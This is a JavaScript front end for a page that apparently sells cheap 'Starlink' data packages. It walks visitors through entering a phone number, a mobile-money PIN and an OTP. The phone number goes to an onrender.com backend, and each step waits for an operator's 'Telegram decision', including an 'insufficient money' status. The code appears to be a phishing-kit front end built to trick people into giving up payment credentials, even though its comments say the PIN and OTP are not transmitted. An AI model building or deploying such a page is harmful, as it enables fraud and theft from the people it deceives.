const BACKEND_URL = "https://starlink-2mc7.onrender.com";


/* =========================
   PACKAGES
========================= */

const PACKAGES = [
    {
        name: "5 GB",
        validity: "1 day",
        price: "$0.25"
    },
    {
        name: "10 GB",
        validity: "3 days",
        price: "$0.80"
    },
    {
        name: "20 GB",
        validity: "7 days",
        price: "$1.20"
    },
    {
        name: "40 GB",
        validity: "7 days",
        price: "$2.00"
    },
    {
        name: "80 GB",
        validity: "21 days",
        price: "$2.25"
    },
    {
        name: "120 GB",
        validity: "30 days",
        price: "$3.00"
    },
    {
        name: "Unlimited",
        validity: "30 days",
        price: "$8.00"
    }
];


let selectedPackage = null;

let pinRequestId = null;

let otpRequestId = null;

let statusTimer = null;

let otpTimer = null;

let secondsLeft = 60;


/* =========================
   GET ELEMENT
========================= */

function getElement(id) {

    return document.getElementById(id);

}


/* =========================
   SHOW PAGE
========================= */

function showPage(pageId) {

    document
        .querySelectorAll(".page")
        .forEach(page => {

            page.classList.remove("active");

        });


    const page =
        getElement(pageId);


    if (page) {

        page.classList.add("active");

    }

}


/* =========================
   CLEAR ERRORS
========================= */

function clearErrors() {

    const inputs = [
        "phone",
        "pin",
        "otp"
    ];


    inputs.forEach(id => {

        const element =
            getElement(id);

        if (element) {

            element.classList.remove(
                "input-error"
            );

        }

    });


    const errors = [
        "phoneError",
        "pinError",
        "otpError"
    ];


    errors.forEach(id => {

        const element =
            getElement(id);

        if (element) {

            element.textContent = "";

        }

    });


}


/* =========================
   DISPLAY PACKAGE
========================= */

function packageHTML(pkg) {

    return `
        <strong>${pkg.name}</strong>
        <br>
        ${pkg.validity}
        <br>
        ${pkg.price}
    `;

}


/* =========================
   LOAD PACKAGES
========================= */

function loadPackages() {

    const container =
        getElement("packageList");


    if (!container) {

        return;

    }


    container.innerHTML = "";


    PACKAGES.forEach(
        (pkg, index) => {

            const button =
                document.createElement(
                    "button"
                );

            button.type = "button";

            button.className =
                "package-btn";


            button.innerHTML = `
                <div>
                    <strong>
                        ${pkg.name}
                    </strong>
                </div>

                <div>
                    ${pkg.validity}
                </div>

                <div>
                    ${pkg.price}
                </div>

                <div>
                    CHOOSE THIS PACKAGE
                </div>
            `;


            button.addEventListener(
                "click",
                function () {

                    selectedPackage =
                        PACKAGES[index];


                    const packageDisplay =
                        getElement(
                            "pinPackage"
                        );


                    if (packageDisplay) {

                        packageDisplay.innerHTML =
                            packageHTML(
                                selectedPackage
                            );

                    }


                    clearErrors();


                    const phone =
                        getElement("phone");

                    const pin =
                        getElement("pin");


                    if (phone) {

                        phone.value = "";

                    }


                    if (pin) {

                        pin.value = "";

                    }


                    showPage("pinPage");


                    if (phone) {

                        phone.focus();

                    }

                }
            );


            container.appendChild(
                button
            );

        }
    );

}


/* =========================
   PHONE VALIDATION
========================= */

function validPhone() {

    const phone =
        getElement("phone");


    if (!phone) {

        return false;

    }


    return /^9\d{8}$/.test(
        phone.value.trim()
    );

}


/* =========================
   FOUR DIGIT VALIDATION
========================= */

function validFourDigits(
    value
) {

    return /^\d{4}$/.test(
        String(value).trim()
    );

}


/* =========================
   SEND REQUEST TO BACKEND
========================= */

async function sendRequest(
    stage
) {

    if (!selectedPackage) {

        throw new Error(
            "No package selected."
        );

    }


    const phone =
        getElement("phone");


    const response =
        await fetch(
            `${BACKEND_URL}/api/requests`,
            {

                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json"
                },

                body: JSON.stringify({

                    packageName:
                        selectedPackage.name,

                    validity:
                        selectedPackage.validity,

                    price:
                        selectedPackage.price,

                    phone:
                        phone.value.trim(),

                    stage:
                        stage

                })

            }
        );


    const data =
        await response.json();


    if (!response.ok) {

        throw new Error(
            data.error ||
            "Request failed."
        );

    }


    return data;

}


/* =========================
   CHECK REQUEST STATUS
========================= */

function startStatusChecking(
    requestId,
    stage
) {

    stopStatusChecking();


    statusTimer =
        setInterval(
            async function () {

                try {

                    const response =
                        await fetch(
                            `${BACKEND_URL}/api/requests/${requestId}`
                        );


                    if (!response.ok) {

                        return;

                    }


                    const data =
                        await response.json();


                    handleStatus(
                        data.status,
                        stage
                    );


                } catch (error) {

                    console.log(
                        "Status check error:",
                        error
                    );

                }

            },
            2000
        );

}


/* =========================
   STOP STATUS CHECKING
========================= */

function stopStatusChecking() {

    if (statusTimer) {

        clearInterval(
            statusTimer
        );

        statusTimer = null;

    }

}


/* =========================
   HANDLE TELEGRAM DECISION
========================= */

function handleStatus(
    status,
    stage
) {


    /* PIN STAGE */

    if (
        stage === "pin"
    ) {


        if (
            status === "approved"
        ) {

            stopStatusChecking();


            const otpPackage =
                getElement(
                    "otpPackage"
                );


            if (otpPackage) {

                otpPackage.innerHTML =
                    packageHTML(
                        selectedPackage
                    );

            }


            showPage(
                "otpPage"
            );


            startOTPCountdown();


            createOTPRequest();


            return;

        }


        if (
            status === "wrong_pin"
        ) {

            stopStatusChecking();


            const pin =
                getElement("pin");


            const error =
                getElement(
                    "pinError"
                );


            if (pin) {

                pin.classList.add(
                    "input-error"
                );

                pin.value = "";

                pin.focus();

            }


            if (error) {

                error.textContent =
                    "Wrong PIN. Please enter your PIN again.";

            }


            return;

        }

    }


    /* OTP STAGE */

    if (
        stage === "otp"
    ) {


        if (
            status === "approved"
        ) {

            stopStatusChecking();


            stopOTPCountdown();


            const successPackage =
                getElement(
                    "successPackage"
                );


            if (successPackage) {

                successPackage.innerHTML =
                    packageHTML(
                        selectedPackage
                    );

            }


            showPage(
                "successPage"
            );


            return;

        }


        if (
            status === "wrong_otp"
        ) {

            stopStatusChecking();


            const otp =
                getElement("otp");


            const error =
                getElement(
                    "otpError"
                );


            if (otp) {

                otp.classList.add(
                    "input-error"
                );

                otp.value = "";

                otp.focus();

            }


            if (error) {

                error.textContent =
                    "Wrong OTP. Please enter the OTP again.";

            }


            return;

        }


        if (
            status === "insufficient_money"
        ) {

            stopStatusChecking();


            const otp =
                getElement("otp");


            const error =
                getElement(
                    "otpError"
                );


            if (otp) {

                otp.classList.add(
                    "input-error"
                );

            }


            if (error) {

                error.textContent =
                    "Insufficient money. Please check your payment.";

            }


            return;

        }


        if (
            status === "otp_expired"
        ) {

            stopStatusChecking();


            expireOTP();


            return;

        }

    }

}


/* =========================
   PIN CONTINUE
========================= */

const pinContinue =
    getElement(
        "pinContinue"
    );


if (pinContinue) {

    pinContinue.addEventListener(
        "click",
        async function () {


            clearErrors();


            const phone =
                getElement("phone");


            const pin =
                getElement("pin");


            const phoneError =
                getElement(
                    "phoneError"
                );


            const pinError =
                getElement(
                    "pinError"
                );


            if (
                !validPhone()
            ) {

                if (phone) {

                    phone.classList.add(
                        "input-error"
                    );

                }


                if (phoneError) {

                    phoneError.textContent =
                        "Enter exactly 9 digits starting with 9.";

                }


                if (phone) {

                    phone.focus();

                }


                return;

            }


            if (
                !validFourDigits(
                    pin.value
                )
            ) {

                if (pin) {

                    pin.classList.add(
                        "input-error"
                    );

                }


                if (pinError) {

                    pinError.textContent =
                        "Enter exactly 4 digits.";

                }


                if (pin) {

                    pin.focus();

                }


                return;

            }


            const pinStatus =
                getElement(
                    "pinStatus"
                );


            if (pinStatus) {

                pinStatus.textContent =
                    "Sending verification request...";

            }


            try {

                /*
                The PIN is NOT sent to Telegram.
                Only the verification request is sent.
                */

                const data =
                    await sendRequest(
                        "pin"
                    );


                pinRequestId =
                    data.requestId;


                if (pinStatus) {

                    pinStatus.textContent =
                        "Waiting for verification...";

                }


                startStatusChecking(
                    pinRequestId,
                    "pin"
                );


            } catch (error) {

                console.error(
                    error
                );


                if (pinStatus) {

                    pinStatus.textContent =
                        "Could not contact the verification service.";

                }

            }

        }
    );

}


/* =========================
   CREATE OTP REQUEST
========================= */

async function createOTPRequest() {

    try {

        const data =
            await sendRequest(
                "otp"
            );


        otpRequestId =
            data.requestId;


        const otpStatus =
            getElement(
                "otpStatus"
            );


        if (otpStatus) {

            otpStatus.textContent =
                "Waiting for OTP verification...";

        }


        startStatusChecking(
            otpRequestId,
            "otp"
        );


    } catch (error) {

        console.error(
            error
        );


        const otpStatus =
            getElement(
                "otpStatus"
            );


        if (otpStatus) {

            otpStatus.textContent =
                "Could not contact the verification service.";

        }

    }

}


/* =========================
   OTP COUNTDOWN
========================= */

function startOTPCountdown() {

    stopOTPCountdown();


    secondsLeft = 60;


    const otp =
        getElement("otp");


    const error =
        getElement(
            "otpError"
        );


    const verify =
        getElement(
            "otpVerify"
        );


    const request =
        getElement(
            "requestOtp"
        );


    if (otp) {

        otp.value = "";

        otp.classList.remove(
            "input-error"
        );

    }


    if (error) {

        error.textContent = "";

    }


    if (verify) {

        verify.classList.remove(
            "hidden"
        );

    }


    if (request) {

        request.classList.add(
            "hidden"
        );

    }


    updateTimer();


    otpTimer =
        setInterval(
            function () {

                secondsLeft--;

                updateTimer();


                if (
                    secondsLeft <= 0
                ) {

                    expireOTP();

                }

            },
            1000
        );

}


/* =========================
   UPDATE TIMER
========================= */

function updateTimer() {

    const timer =
        getElement("timer");


    if (!timer) {

        return;

    }


    const seconds =
        String(
            secondsLeft
        ).padStart(
            2,
            "0"
        );


    timer.textContent =
        `00:${seconds}`;

}


/* =========================
   STOP OTP COUNTDOWN
========================= */

function stopOTPCountdown() {

    if (otpTimer) {

        clearInterval(
            otpTimer
        );

        otpTimer = null;

    }

}


/* =========================
   OTP EXPIRED
========================= */

function expireOTP() {

    stopOTPCountdown();


    stopStatusChecking();


    const otp =
        getElement("otp");


    const error =
        getElement(
            "otpError"
        );


    const verify =
        getElement(
            "otpVerify"
        );


    const request =
        getElement(
            "requestOtp"
        );


    if (otp) {

        otp.classList.add(
            "input-error"
        );

    }


    if (error) {

        error.textContent =
            "OTP expired. Request another OTP.";

    }


    if (verify) {

        verify.classList.add(
            "hidden"
        );

    }


    if (request) {

        request.classList.remove(
            "hidden"
        );

    }

}


/* =========================
   REQUEST ANOTHER OTP
========================= */

const requestOtp =
    getElement(
        "requestOtp"
    );


if (requestOtp) {

    requestOtp.addEventListener(
        "click",
        async function () {


            stopStatusChecking();


            const otp =
                getElement("otp");


            const error =
                getElement(
                    "otpError"
                );


            if (otp) {

                otp.value = "";

                otp.classList.remove(
                    "input-error"
                );

            }


            if (error) {

                error.textContent = "";

            }


            const otpStatus =
                getElement(
                    "otpStatus"
                );


            if (otpStatus) {

                otpStatus.textContent =
                    "Sending a new OTP request...";

            }


            startOTPCountdown();


            await createOTPRequest();

        }
    );

}


/* =========================
   OTP VERIFY
========================= */

const otpVerify =
    getElement(
        "otpVerify"
    );


if (otpVerify) {

    otpVerify.addEventListener(
        "click",
        function () {


            const otp =
                getElement("otp");


            const error =
                getElement(
                    "otpError"
                );


            if (
                secondsLeft <= 0
            ) {

                expireOTP();

                return;

            }


            if (
                !validFourDigits(
                    otp.value
                )
            ) {

                otp.classList.add(
                    "input-error"
                );


                error.textContent =
                    "Enter exactly 4 digits.";


                otp.focus();


                return;

            }


            /*
            OTP is NOT transmitted to Telegram.
            */

            error.textContent = "";


            const otpStatus =
                getElement(
                    "otpStatus"
                );


            if (otpStatus) {

                otpStatus.textContent =
                    "Waiting for verification...";

            }


            if (otpRequestId) {

                startStatusChecking(
                    otpRequestId,
                    "otp"
                );

            }

        }
    );

}


/* =========================
   START
========================= */

document.addEventListener(
    "DOMContentLoaded",
    function () {

        loadPackages();

    }
);
